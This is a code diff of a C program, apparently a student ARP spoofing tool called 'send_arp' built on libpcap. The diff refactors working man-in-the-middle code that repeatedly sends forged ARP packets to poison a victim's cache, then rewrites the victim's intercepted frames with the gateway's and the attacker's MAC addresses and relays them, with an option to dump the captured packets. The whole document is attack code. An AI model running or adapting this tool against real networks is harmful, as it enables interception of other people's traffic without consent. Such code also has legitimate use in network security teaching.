@@ -18,6 +18,7 @@ u_int8_t my_mac[6];
 u_int8_t victim_mac[6];
 u_int8_t gateway_mac[6];
 int check = 0;
+bool show_check = 0;
 
 typedef struct
 {
@@ -69,7 +70,7 @@ unsigned char *get_macaddr(char *ether) {
 }
 
 void pcap_setting(char *argv[]) {
-	handle = pcap_open_live(argv[1], BUF_SIZE, 1, 1000, errbuf); // MAX recv byte, promis(1-every,0-me), time out
+	handle = pcap_open_live(argv[1], BUF_SIZE, 1, 100, errbuf); // MAX recv byte, promis(1-every,0-me), time out
 	if (handle == NULL) {
 		fprintf(stderr, "Couldn't open device %s: %s\n", argv[1], errbuf);
 		exit(0);
@@ -88,40 +89,40 @@ void pcap_setting(char *argv[]) {
 }
 
 int arp_packet_send(char *mac, char *sender, char *target) { //
-		struct libnet_ethernet_hdr eth;
-		arp_header arp;
-		// dynamic alloc
-		int header_size = sizeof(libnet_ethernet_hdr) + sizeof(arp_header) + padding_size; //42 + 18
-		//printf("size : %d\n", header_size);
-		u_int8_t *packet = (u_int8_t*)malloc(sizeof(u_int8_t)*header_size);
-		memset(packet, 0, header_size);
+	struct libnet_ethernet_hdr eth;
+	arp_header arp;
+	// dynamic alloc
+	int header_size = sizeof(libnet_ethernet_hdr) + sizeof(arp_header) + padding_size; //42 + 18
+																					   //printf("size : %d\n", header_size);
+	u_int8_t *packet = (u_int8_t*)malloc(sizeof(u_int8_t)*header_size);
+	memset(packet, 0, header_size);
 
-		// ethernet packet struct //
-		memset(eth.ether_dhost, 0xff, 6);
-		memcpy(eth.ether_shost, get_macaddr(mac), 6);
-		eth.ether_type = htons(ETHERTYPE_ARP);
-		memcpy(packet, &eth, sizeof(libnet_ethernet_hdr));
+	// ethernet packet struct //
+	memset(eth.ether_dhost, 0xff, 6);
+	memcpy(eth.ether_shost, my_mac, 6);
+	eth.ether_type = htons(ETHERTYPE_ARP);
+	memcpy(packet, &eth, sizeof(libnet_ethernet_hdr));
 
-		// arp packet struct //
-		arp.ar_hrd = htons(ARPHRD_ETHER);
-		arp.ar_pro = htons(ETHERTYPE_IP);
-		arp.ar_hln = 0x06;
-		arp.ar_pln = 0x04;
-		arp.ar_op = htons(ARPOP_REQUEST);
-		// arp mac, ip struct //
-		memset(arp.target_mac, 0x00, 6);
-		memcpy(arp.sender_mac, get_macaddr(mac), 6);
-		inet_pton(AF_INET, sender, arp.sender_ip);
-		inet_pton(AF_INET, target, arp.target_ip);
-		memcpy(packet + sizeof(libnet_ethernet_hdr), &arp, sizeof(arp_header));
+	// arp packet struct //
+	arp.ar_hrd = htons(ARPHRD_ETHER);
+	arp.ar_pro = htons(ETHERTYPE_IP);
+	arp.ar_hln = 0x06;
+	arp.ar_pln = 0x04;
+	arp.ar_op = htons(ARPOP_REQUEST);
+	// arp mac, ip struct //
+	memset(arp.target_mac, 0x00, 6);
+	memcpy(arp.sender_mac, my_mac, 6);
+	inet_pton(AF_INET, sender, arp.sender_ip);
+	inet_pton(AF_INET, target, arp.target_ip);
+	memcpy(packet + sizeof(libnet_ethernet_hdr), &arp, sizeof(arp_header));
 
-		for (int i = 0; i < header_size; i++) {
-			//printf("%02x ", packet[i]);
-		} //printf("\n");
+	for (int i = 0; i < header_size; i++) {
+		//printf("%02x ", packet[i]);
+	} //printf("\n");
 
-		if (pcap_sendpacket(handle, (const unsigned char*)packet, header_size) != 0) {
-			fprintf(stderr, "\n[p]Error : %s\n", pcap_geterr(handle));
-		}
+	if (pcap_sendpacket(handle, (const unsigned char*)packet, header_size) != 0) {
+		fprintf(stderr, "\n[p]Error : %s\n", pcap_geterr(handle));
+	}
 }
 
 void *send_arp_thread(void *argv)
@@ -129,46 +130,39 @@ void *send_arp_thread(void *argv)
 	char **argvs = ((char**)argv);
 	//printf("%s ", argvs[1]);
 	while (1) {
-		if(check == 2)
+		if (check == 2)
 			arp_packet_send(argvs[1], argvs[2], argvs[3]);
 		sleep(2); // 2 seconds send
 	}
 }
 
-int ip_check(unsigned int value, u_int8_t *value2){
+int ip_check(unsigned int value, u_int8_t *value2) {
 	int cnt = 0;
 	u_int8_t temp[4];
 	temp[0] = (unsigned int)value & 0x000000FF;
-	temp[1] = ((unsigned int)value & 0x0000FF00)>>8 ;
-	temp[2] = ((unsigned int)value & 0x00FF0000)>>16 ;
-	temp[3] = ((unsigned int)value & 0xFF000000)>>24 ;
-		for(int i=0;i<4;i++){
-			if(temp[cnt] == value2[cnt]){
-				printf("tt\n");
-				cnt++;
-			}
+	temp[1] = ((unsigned int)value & 0x0000FF00) >> 8;
+	temp[2] = ((unsigned int)value & 0x00FF0000) >> 16;
+	temp[3] = ((unsigned int)value & 0xFF000000) >> 24;
+	for (int i = 0; i < 4; i++) {
+		if (temp[cnt] == value2[cnt]) {
+			cnt++;
 		}
-	if(cnt == 4)
-		return 1;
-	else 
+	}
+	if (cnt == 4) {
+	printf("get ip\n");
+	return 1;
+	}else {
 		return 0;
+	}
 }
 
 int check_mac(const unsigned char *pkt_data, char* src, unsigned char* des) {
 	if (pkt_data[21] == 2) { // arp recv
 		struct libnet_ethernet_hdr *ethz = (struct libnet_ethernet_hdr*)pkt_data;
-		arp_header *arp = (arp_header*)(pkt_data+14);
+		arp_header *arp = (arp_header*)(pkt_data + 14);
 		unsigned int value = inet_addr(src);
-		if (ip_check(value,arp->sender_ip) == 1) {
+		if (ip_check(value, arp->sender_ip) == 1) {
 			memcpy(des, ethz->ether_shost, 6);
-			return 1;
-		}
-		return 0;
-
-		memcpy(victim_mac, ethz->ether_shost, 6);
-		for (int i = 0; i < 6; i++)
-			printf("%02X ", ethz->ether_dhost[i]);
-		if (strcmp((char*)ethz->ether_dhost, (char*)my_mac)) {
 			return 1;
 		}
 		return 0;
@@ -176,40 +170,40 @@ int check_mac(const unsigned char *pkt_data, char* src, unsigned char* des) {
 }
 
 
-void printPacket(const unsigned char* packet,int len)
+void packet_show(const unsigned char* packet, int len)
 {
-    int i;
-    for ( i=0; i < len ; i++ ){
-        if (i%16 ==0 && i != 0){
-            printf("  ");
-            for ( int j=-16;j<=-1;j++ ){
-                if (j == -8)
-                    printf("  ");
-                if (isprint(*(packet+i+j)))
-                    printf("%c", *(packet+i+j));
-                else
-                    printf(".");
-            }
-            printf("\n");
-        }
-        if ( i % 8 ==0 )
-            printf ("  ");
-        printf("%02x ", *(packet+i));
-    }
-    for(i=0;i<16-(len%16);i++){
-        printf("   ");
-        if ( i % 8 ==0 )
-            printf ("  ");
-    }
-    for ( int i=(len/16)*16;i<len;i++ ){
-        if (i%8 == 0 && i%16 != 0)
-            printf("  ");
-        if (isprint(*(packet+i)))
-            printf("%c", *(packet+i));
-        else
-            printf(".");
-    }
-    printf("\n");
+	int i;
+	for (i = 0; i < len; i++) {
+		if (i % 16 == 0 && i != 0) {
+			printf("  ");
+			for (int j = -16; j <= -1; j++) {
+				if (j == -8)
+					printf("  ");
+				if (isprint(*(packet + i + j)))
+					printf("%c", *(packet + i + j));
+				else
+					printf(".");
+			}
+			printf("\n");
+		}
+		if (i % 8 == 0)
+			printf("  ");
+		printf("%02x ", *(packet + i));
+	}
+	for (i = 0; i<16 - (len % 16); i++) {
+		printf("   ");
+		if (i % 8 == 0)
+			printf("  ");
+	}
+	for (int i = (len / 16) * 16; i<len; i++) {
+		if (i % 8 == 0 && i % 16 != 0)
+			printf("  ");
+		if (isprint(*(packet + i)))
+			printf("%c", *(packet + i));
+		else
+			printf(".");
+	}
+	printf("\n");
 }
 
 
@@ -223,7 +217,7 @@ void parser(char **argvs) {
 	struct libnet_tcp_hdr *tcph;
 	int res = 0;
 	while (1) {
-		arp_packet_send(argvs[1], argvs[3], "192.168.0.1");
+		arp_packet_send(argvs[1], argvs[3], argvs[2]);
 		res = pcap_next_ex(handle, &headers, &pkt_data);
 		if (res < 0) {
 			fprintf(stderr, "pcap_next_ex error");
@@ -233,12 +227,12 @@ void parser(char **argvs) {
 			printf("timeout! \n");
 			continue;
 		}
-		if (check_mac(pkt_data, "192.168.0.1", gateway_mac) == 1) {
+		if (check_mac(pkt_data, argvs[2], gateway_mac) == 1) {
 			break;
 		}
 	}
 	while (1) {
-		arp_packet_send(argvs[1], argvs[2], argvs[3]); 
+		arp_packet_send(argvs[1], argvs[2], argvs[3]);
 		res = pcap_next_ex(handle, &headers, &pkt_data);
 		if (res < 0) {
 			fprintf(stderr, "pcap_next_ex error");
@@ -263,31 +257,16 @@ void parser(char **argvs) {
 			printf("timeout! \n");
 			continue;
 		}
-		if (check == 2 && pkt_data[21] != 2 && pkt_data[21] != 1  ) {
+		if (check == 2 && pkt_data[21] != 2 && pkt_data[21] != 1) {
 			ethz = (struct libnet_ethernet_hdr*)pkt_data;
-			if(victim_mac[5] == ethz->ether_shost[5]){
-				memcpy(ethz->ether_dhost, gateway_mac, 6);
-				memcpy(ethz->ether_shost, my_mac, 6);
+			if (memcmp((const void *)ethz->ether_shost, (const void *)victim_mac, 6) == 0) {
+				memcpy(ethz->ether_dhost, gateway_mac, 6); // destination : gateway change
+				memcpy(ethz->ether_shost, my_mac, 6); // source : my_mac 
 				if (pcap_sendpacket(handle, (const unsigned char*)pkt_data, headers->len) != 0) {
-					fprintf(stderr, "\n[s]Error!! : %s\n", pcap_geterr(handle));
-				}else { printf("send ok\n");}
-			printPacket(pkt_data,60);
-
+					printf("send error");
+				}
+				if(show_check == 1) packet_show(pkt_data, headers->len);
 			}
-
-/*
-			printf("게이트웨이:");
-			for (int i = 0; i < 6; i++)
-				printf("%02X ", gateway_mac[i]);
-			printf("빅팀:");
-			for (int i = 0; i < 6; i++)
-				printf("%02X ", victim_mac[i]);
-			ethz = (struct libnet_ethernet_hdr*)pkt_data;
-
-			if (pcap_sendpacket(handle, (const unsigned char*)pkt_data, sizeof(pkt_data)) != 0) {
-				fprintf(stderr, "\nError : %s\n", pcap_geterr(handle));
-			}else { printf("send ok\n");}
-*/
 		}
 	}
 }
@@ -301,18 +280,18 @@ void *rcv_send_thread(void *argv)
 int main(int argc, char *argv[]) {
 	pthread_t pthread_arp_send;
 	pthread_t pthread_rcv_send;
-	int thr_id[2]; //thread generation error check
-	int status; //thread 종료시 반환하는 값 저장 변수
+	int thr_id[2]; // error check variable
+	int status;
 
 	memcpy((char*)my_mac, get_macaddr(argv[1]), 6); // my_amc alloc
 
-	if (argc != 4) {  // argv exception
-		fprintf(stderr, "send_arp <interface> <sender ip> <target ip> \n");
+	if (argc < 4) {  // argv exception
+		fprintf(stderr, "send_arp <interface> <sender ip> <target ip> \nexample : send_arp ens1 192.168.0.1 192.168.0.9");
 		exit(0);
 	}
+	if (argc == 5 && (strcmp(argv[4], "-show") == 0)) show_check = 1;
 
-	pcap_setting(argv);
-	//arp_packet_send(argv);
+	pcap_setting(argv); // pcap lib open
 
 	thr_id[0] = pthread_create(&pthread_arp_send, NULL, send_arp_thread, argv);
 	if (thr_id[0] < 0)
